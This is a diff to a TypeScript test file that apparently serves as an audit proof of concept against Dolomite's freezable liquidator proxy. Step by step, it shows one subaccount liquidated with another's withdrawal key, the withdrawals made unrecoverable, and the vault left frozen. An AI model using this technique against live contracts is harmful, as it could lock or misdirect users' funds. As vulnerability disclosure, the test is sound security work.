@@ -55,8 +55,8 @@ const defaultAccountNumber = ZERO_BI;
 const borrowAccountNumber = defaultAccountNumber.add(ONE_BI);
 const borrowAccountNumber2 = borrowAccountNumber.add(ONE_BI);
 
-const amountWei = ONE_ETH_BI.mul('1234'); // 1,234
-const amountWeiForSecond = ONE_ETH_BI.mul('1234'); // 1,234
+const amountWei = ONE_ETH_BI.mul('1235');
+const amountWeiForSecond = ONE_ETH_BI.mul('1234');
 
 describe('IsolationModeFreezableLiquidatorProxy', () => {
   let snapshotId: string;
@@ -354,7 +354,7 @@ describe('IsolationModeFreezableLiquidatorProxy', () => {
     }
 
     async function getMarketBalances(account: any) {
-      const balances = new Map<string, BigNumber>();;
+      const balances = new Map<string, BigNumber>();
       const markets = await core.dolomiteMargin.getAccountMarketsWithBalances(account);
       for (const market of markets) {
         const par = await core.dolomiteMargin.getAccountPar(account, market.toNumber());
@@ -363,8 +363,17 @@ describe('IsolationModeFreezableLiquidatorProxy', () => {
       return balances;
     }
 
-    it.only('exploit liquidations using hijacked withdrawal keys', async () => {
-
+    /*
+      In the POC we:
+      - prepare 2 borrow positions for liquidation: account 1 and account 2
+      - both preparations fail with "Undercollateralized account" and the AsyncWithdrawalFailed event fired
+      - we liquidated account 1 by using the withdrawal key to account 2
+      - we then show that you can't liquidate account 2 using account 1's key in several scenarios
+      - we also show that account 1 can't get his withdrawal back using executeWithdrawalForRetry
+      - during the above operations we regular modify the token prices to bring accounts in a collateralized or uncollateralized state
+    */
+    it.only('Withdrawal Keys Misused by Differing Subaccount in Liquidations', async () => {
+      // with the specific initial prices only the first borrower, "borrowAccountNumber" is undercollateralized 
       const {
         amountWeiForLiquidation: _amountWeiForLiquidationOne,
         wethAmount: _wethAmountOne
@@ -378,34 +387,34 @@ describe('IsolationModeFreezableLiquidatorProxy', () => {
 
       const firstBorrowerKey = await prepareAccountForLiquidation(liquidAccount, borrowAccountNumber, amountWei);
       console.log(
-        `Account ${borrowAccountNumber} liquidation preparation for amount: ${amountWei} done: withdrawal key: ${firstBorrowerKey}`
+        ` 1. Account ${borrowAccountNumber} liquidation preparation for amount: ${amountWei} done: withdrawal key: ${firstBorrowerKey}`
         );
 
-      console.log("increase the price of WETH by 50% so that the second borrower is also undercollateralized");
+      console.log(" 2. We increase the price of WETH by 50% so that the second borrower is also undercollateralized");
       const increasedWethPrice = initialWethPrice.mul(150).div(100);
       await core.testEcosystem!.testPriceOracle.setPrice(core.tokens.weth.address, increasedWethPrice);
 
-      const secondBorrowerKey = await prepareAccountForLiquidation(liquidAccount2, borrowAccountNumber2, amountWei);
+      const secondBorrowerKey = await prepareAccountForLiquidation(liquidAccount2, borrowAccountNumber2, amountWeiForSecond);
       console.log(
-        `Account ${borrowAccountNumber2} liquidation preparation for amount: ${amountWei} done: withdrawal key: ${secondBorrowerKey}`
+        ` 3. Account ${borrowAccountNumber2} liquidation preparation for amount: ${amountWeiForSecond} done: withdrawal key: ${secondBorrowerKey}`
       );
 
-      console.log("decrease the price of WETH by 65% so that the first borrower is undercollateralized but not maximum so as to avoid the amounts equal available bug");
+      console.log(" 4. We decrease the price of WETH by 65% so that the first borrower is undercollateralized but his liquidation will not use up his entire available amount. We do this to avoid the AIMUTI-1 bug");
       const decreasedWethPrice = initialWethPrice.mul(35).div(100);
       await core.testEcosystem!.testPriceOracle.setPrice(core.tokens.weth.address, decreasedWethPrice);
 
-      console.log("Balances for accounts before liquidations are normal");
+      console.log(" 5. Balances for accounts before liquidations are normal");
       const liquidAccountOneBeforeBalances = await getMarketBalances(liquidAccount);
       expect(liquidAccountOneBeforeBalances.get(marketId.toString())?.toString()).to.be.equal(amountWei.toString());
       expect(liquidAccountOneBeforeBalances.get(core.marketIds.weth.toString())?.isZero()).to.be.false;
-      expect(liquidAccountOneBeforeBalances.get(core.marketIds.nativeUsdc!.toString()) === undefined).to.be.true; // balance 0 but javavascript
+      expect(liquidAccountOneBeforeBalances.get(core.marketIds.nativeUsdc!.toString()) === undefined).to.be.true; // balance 0
 
       const liquidAccountTwoBeforeBalances = await getMarketBalances(liquidAccount2);
-      expect(liquidAccountTwoBeforeBalances.get(marketId.toString())?.toString()).to.be.equal(amountWei.toString());
+      expect(liquidAccountTwoBeforeBalances.get(marketId.toString())?.toString()).to.be.equal(amountWeiForSecond.toString());
       expect(liquidAccountTwoBeforeBalances.get(core.marketIds.weth.toString())?.isZero()).to.be.false;
-      expect(liquidAccountTwoBeforeBalances.get(core.marketIds.nativeUsdc!.toString()) === undefined).to.be.true; // balance 0 but javavascript
+      expect(liquidAccountTwoBeforeBalances.get(core.marketIds.nativeUsdc!.toString()) === undefined).to.be.true; // balance 0
 
-      console.log(`Liquidating account ${liquidAccount.number} but using accounts' ${borrowAccountNumber2} key: ${secondBorrowerKey}`);
+      console.log(` 6. Liquidating account ${liquidAccount.number} but using accounts' ${borrowAccountNumber2} key: ${secondBorrowerKey}`);
       await executeProxyLiquidation(
         solidAccount, 
         liquidAccount, 
@@ -415,10 +424,10 @@ describe('IsolationModeFreezableLiquidatorProxy', () => {
         _wethAmountOne
       );
 
-      console.log("Balances for accounts after liquidations show no change to second account and first account has only liquidation output token");
+      console.log(" 7. Balances for accounts after liquidations show no change to second account and first account has only liquidation output token");
       const liquidAccountOneAfterBalances = await getMarketBalances(liquidAccount);
-      expect(liquidAccountOneAfterBalances.get(marketId.toString()) === undefined).to.be.true; // balance 0 but javavascript
-      expect(liquidAccountOneAfterBalances.get(core.marketIds.weth.toString()) === undefined).to.be.true; // balance 0 but javavascript
+      expect(liquidAccountOneAfterBalances.get(marketId.toString()) === undefined).to.be.false; // balance 0
+      expect(liquidAccountOneAfterBalances.get(core.marketIds.weth.toString()) === undefined).to.be.true; // balance 0
       expect(liquidAccountOneAfterBalances.get(core.marketIds.nativeUsdc!.toString())?.isZero()).to.be.false; // liquidation output token was in USDC
 
       const liquidAccountTwoAfterBalances = await getMarketBalances(liquidAccount2);
@@ -426,21 +435,22 @@ describe('IsolationModeFreezableLiquidatorProxy', () => {
       expect(liquidAccountTwoAfterBalances.get(core.marketIds.weth.toString())).to.be.equal(liquidAccountTwoBeforeBalances.get(core.marketIds.weth.toString()));
       expect(liquidAccountTwoAfterBalances.get(core.marketIds.nativeUsdc!.toString())).to.be.equal(liquidAccountTwoBeforeBalances.get(core.marketIds.nativeUsdc!.toString()));
 
-      console.log(`Since account ${liquidAccount.number} is now over-collateralized, the operation to retrieve his failed withdrawal can initiated by a trusted handler`);      
+      console.log(` 8. Since account ${liquidAccount.number} is now over-collateralized, the operation to retrieve his failed withdrawal can be initiated by a trusted handler`);
       
       await gmxV2Registry.connect(core.governance).ownerSetIsHandler(core.hhUser1.address, true);
       const unwrapperAsTrustedHandler = unwrapper.connect(core.hhUser1);
       const result = await unwrapperAsTrustedHandler.executeWithdrawalForRetry(firstBorrowerKey, {gasLimit: 30_000_000});
       await result.wait();
-      console.log("But this operation will fail since adding the extra funds from the initial key would be interpreted by DolomiteMargin as an increase in borrowing from the GM market, which is a closed market");
+
+      console.log(" 9. But this operation will fail since adding the extra funds from the initial key would be interpreted by DolomiteMargin as an increase in borrowing from the GM market, which is a closed market");
       await expectEvent(eventEmitter, result, 'AsyncWithdrawalFailed', {
         key: firstBorrowerKey,
         token: factory.address,
         reason: `OperationImpl: Market is closing <${marketId}>`
       });
 
-      console.log("The second position has also become over-collateralize during the price variation so continuing liquidation will fail regardless of withdrawal key");
-      console.log("If we try to liquidate using the already used second key, even if the second account would of been liquidatable, it reverts on the amount check, which is first");
+      console.log("10. The second position has also become over-collateralize during the price variation we did at (4) so continuing liquidation will fail regardless of withdrawal key");
+      console.log("11. If we try to liquidate using the second key (already used), even if the second account would be liquidatable, it reverts on the amount check since it is done first");
       await expectThrow(
         executeProxyLiquidation(
           solidAccount, 
@@ -452,7 +462,18 @@ describe('IsolationModeFreezableLiquidatorProxy', () => {
         ), 
         "AsyncIsolationModeUnwrapperImpl: Invalid input amount"
         );
-        console.log("If we try to liquidate using the unused first key, it reverts because the second account became over-collateralized due to price variations");
+        await expectThrow(
+          executeProxyLiquidation(
+            solidAccount,
+            liquidAccount2,
+            [secondBorrowerKey],
+            [],
+            _amountWeiForLiquidationTwo,
+            _wethAmountOne
+          ),
+          "AsyncIsolationModeUnwrapperImpl: Invalid input amount"
+          );
+        console.log("12. If we try to liquidate using the unused first key, it reverts because the second account became over-collateralized due to price variations");
       await expectThrow(
         executeProxyLiquidation(
           solidAccount, 
@@ -465,15 +486,33 @@ describe('IsolationModeFreezableLiquidatorProxy', () => {
           `LiquidateOrVaporizeImpl: Unliquidatable account <${vault.address.toLowerCase()}, ${borrowAccountNumber2.toString()}>`
       );
       
-      console.log("Also the second account cannot get his withdrawal back since it was used up by the first liquidator");
+      console.log("13. Also the second account cannot get his withdrawal back since the withdrawal info was cleared by the first liquidator");
       await expectThrow(
         unwrapperAsTrustedHandler.executeWithdrawalForRetry(secondBorrowerKey), 
         "UpgradeableUnwrapperTraderV2: Invalid withdrawal key"
       );
       
-      console.log("This leaves the vault frozen until the second account is again liquidatable and then it must use the first key");
-      console.log("Since vault is frozen, any and all operations from any other sub-accounts are also frozen")
-      expect(await vault.isVaultFrozen()).to.be.true;      
+      console.log("14. This leaves the vault frozen until the second account is again liquidatable and then it must use the first key");
+      console.log("15. Since the vault is frozen, any and all operations from any other sub-accounts are also frozen");
+      expect(await vault.isVaultFrozen()).to.be.true;
+
+      // Make second account liquidatable now to showcase it cannot even be liquidated
+      console.log("16. We increase the price of WETH so that the second borrower is now again undercollateralized");
+      const increasedWethPrice2 = initialWethPrice.mul(200).div(100);
+      await core.testEcosystem!.testPriceOracle.setPrice(core.tokens.weth.address, increasedWethPrice2);
+
+      console.log("17. And show that it cannot be liquidated using the first borrower key since doing so would be interpreted by DolomiteMargin as taking on extra debt and it reverts");
+      await expectThrow(
+        executeProxyLiquidation(
+          solidAccount,
+          liquidAccount2,
+          [firstBorrowerKey],
+          [],
+          _amountWeiForLiquidationTwo,
+          _wethAmountTwo
+        ),
+        `OperationImpl: Market is closing <${marketId}>`
+      );
     });
   });
 });
